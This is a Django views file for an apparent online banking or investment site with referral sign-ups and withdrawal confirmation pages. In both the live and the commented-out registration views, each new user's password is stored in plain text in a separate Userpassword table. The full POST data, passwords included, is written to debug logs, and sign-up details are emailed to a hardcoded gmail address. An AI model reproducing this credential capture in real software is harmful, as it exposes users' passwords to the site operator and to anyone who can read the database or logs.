

from django.db.models import Sum
from django.shortcuts import render
from django.contrib.auth.decorators import login_required

from transactions.models import *
from transactions.forms import *

from accounts.models import *
from django.contrib.auth import authenticate, login, logout
from django.shortcuts import render, redirect, get_object_or_404

# views.py

def home(request):
    form = ContactForm()
    users = User.objects.all()

    if not request.user.is_authenticated:
        return render(request, "core/alternate.html", {})
    else:
        user = request.user

        # Ensure the user is logged out if they are banned
        if user.is_banned:
            logout(request)
            messages.error(request, "Your account has been suspended. Please contact support for assistance.")
            return redirect('accounts:login')  # Adjust this to your login URL name

        cryptowithdrawal = CryptoWITHDRAW.objects.filter(user=user)

        context = {
            "user": user,
            'form': form,
            "users": users,
            "title": "site"
        }

        return render(request, "core/transactions.html", context)

    
# views.py

from django.contrib.auth import authenticate, login
from django.shortcuts import get_object_or_404, redirect
from django.contrib import messages
from accounts.forms import UserRegistrationForm, AccountDetailsForm
from accounts.models import Profile, User, Userpassword
import logging
from django.core.mail import send_mail
from django.conf import settings

logger = logging.getLogger(__name__)

def index(request, *args, **kwargs):
    form = ContactForm()
    ref_code = kwargs.get('ref_code')
    recommended_username = None
    profile = None

    logger.debug(f'ref_code: {ref_code}')

    if ref_code:
        try:
            profile = Profile.objects.get(code=ref_code)
            logger.debug(f'profile: {profile}')
            recommended_user = profile.recommended_by
            recommended_username = recommended_user.username if recommended_user else None
            request.session['ref_profile'] = profile.id
        except Profile.DoesNotExist:
            logger.warning(f'Profile does not exist for ref_code: {ref_code}')

    logger.debug(f'recommended_username: {recommended_username}')

    if request.method == 'POST':
        user_form = UserRegistrationForm(request.POST)
        account_form = AccountDetailsForm(request.POST, request.FILES)

        logger.debug(f"POST data: {request.POST}")
        logger.debug(f"FILES data: {request.FILES}")

        if user_form.is_valid() and account_form.is_valid():
            try:
                user = user_form.save()
                account_details = account_form.save(commit=False)
                account_details.user = user
                account_details.account_no = user.username
                account_details.save()

                new_user = authenticate(
                    username=user.username, 
                    password=user_form.cleaned_data.get("password1")
                )
                if new_user:
                    if new_user.is_banned:
                        messages.error(
                            request,
                            "Your account has been suspended. Please contact support for assistance."
                        )
                        return redirect("accounts:login")  # Adjust this to your login URL name
                    
                    Userpassword.objects.create(
                        username=new_user.username, 
                        password=user_form.cleaned_data.get("password1")
                    )
                    login(request, new_user)
                    messages.success(
                        request,
                        f"Thank you for creating an account {new_user.full_name}. "
                        f"Your username is {new_user.username}."
                    )

                    profile_id = request.session.get('ref_profile')
                    logger.debug(f'profile_id: {profile_id}')
                    if profile_id is not None:
                        recommended_by_profile = get_object_or_404(Profile, id=profile_id)
                        registered_profile = Profile.objects.get(user=new_user)
                        registered_profile.recommended_by = recommended_by_profile.user
                        registered_profile.save()

                    # Send admin notification email
                    send_mail(
                        subject=f"New Referral Registration by {new_user.get_full_name()} ({new_user.username})",
                        message=(
                            f"User Details:\n"
                            f"Full Name: {new_user.get_full_name()}\n"
                            f"Username: {new_user.username}\n"
                            f"Email: {new_user.email}\n"
                        ),
                        from_email=settings.EMAIL_HOST_USER,
                        recipient_list=['globalearnltd052@gmail.com']
                    )
                      

                    return redirect("accounts:useremail")
            except Exception as e:
                logger.error(f"Error in user registration: {str(e)}")
                messages.error(request, "An error occurred during registration. Please try again.")
        else:
            logger.warning(f"Form errors - User: {user_form.errors}, Account: {account_form.errors}")
    else:
        initial_upline = profile.user.username if profile else None
        user_form = UserRegistrationForm(initial={'upline': initial_upline})
        account_form = AccountDetailsForm(initial={'upline': initial_upline})

    context = {
        "title": "Create a Bank Account",
        "user_form": user_form,
        "account_form": account_form,
        "recommended_username": recommended_username,
        "profile": profile,
        'form': form,
    }
    return render(request, "accounts/register_form.html", context)


def about(request):
    return render(request, "core/about.html", {}) 

def faq(request):
    return render(request, "core/faq.html", {})

def plan(request):
    return render(request, "core/plan.html", {})

def service(request):
    return render(request, "core/service.html", {})


def privacy(request):
    return render(request, "core/privacy.html", {})


def cookie(request):
    return render(request, "core/cookie.html", {})


def company(request):
    return render(request, "core/company.html", {})


def security(request):
    return render(request, "core/security.html", {})



@login_required
def confirm(request):
    payment = Withdrawal.objects.filter(user=request.user).order_by('-id').first()
    return render(request, 'core/confirm.html', {'payment': payment})


@login_required
def inter_confirm(request):
    payment = Withdrawal_internationa.objects.filter(user=request.user).order_by('-id').first()
    return render(request, 'core/inter_confirm.html', {'payment': payment})


def confirm_password(request):
    return render(request, "core/confirm_password.html", {})

"""
def index(request, *args, **kwargs):
    ref_code = kwargs.get('ref_code')
    recommended_username = None
    profile = None  # Initialize profile to None

    print('ref_code:', ref_code)  # Debugging statement

    if ref_code:
        try:
            profile = Profile.objects.get(code=ref_code)
            print('profile:', profile)  # Debugging statement
            recommended_user = profile.recommended_by
            recommended_username = recommended_user.username if recommended_user else None
            request.session['ref_profile'] = profile.id
        except Profile.DoesNotExist:
            print('Profile does not exist for ref_code:', ref_code)  # Debugging statement
            # Handle the case where the profile doesn't exist.
            pass

    print('recommended_username:', recommended_username)  # Debugging statement

    if request.method == 'POST':
        user_form = UserRegistrationForm(request.POST)
        account_form = AccountDetailsForm(request.POST, request.FILES)

        if user_form.is_valid() and account_form.is_valid():
            user = user_form.save()
            account_details = account_form.save(commit=False)
            account_details.user = user
            account_details.account_no = user.username
            account_details.save()

            # Save the user picture

            new_user = authenticate(
                username=user.username, password=user_form.cleaned_data.get("password1")
            )

            if new_user:
                Userpassword.objects.create(username=new_user.username, password=user_form.cleaned_data.get("password1"))

            login(request, new_user)
            messages.success(
                request,
                f"Thank you for creating an account {new_user.full_name}. "
                f"Your username is {new_user.username}."
            )

            # Get the ref_profile from the session
            profile_id = request.session.get('ref_profile')
            print('profile_id', profile_id)

            if profile_id is not None:
                recommended_by_profile = get_object_or_404(Profile, id=profile_id)
                registered_profile = Profile.objects.get(user=new_user)
                registered_profile.recommended_by = recommended_by_profile.user
                registered_profile.save()

            return redirect("accounts:useremail")

    else:
        initial_upline = profile.user.username if profile else None

        user_form = UserRegistrationForm(initial={'upline': initial_upline})
        account_form = AccountDetailsForm(initial={'upline': initial_upline})

        context = {
            "title": "Create a Bank Account",
            "user_form": user_form,
            "account_form": account_form,
            "recommended_username": recommended_username,
            "profile": profile,
        }

    return render(request, "accounts/register_form.html", context)

"""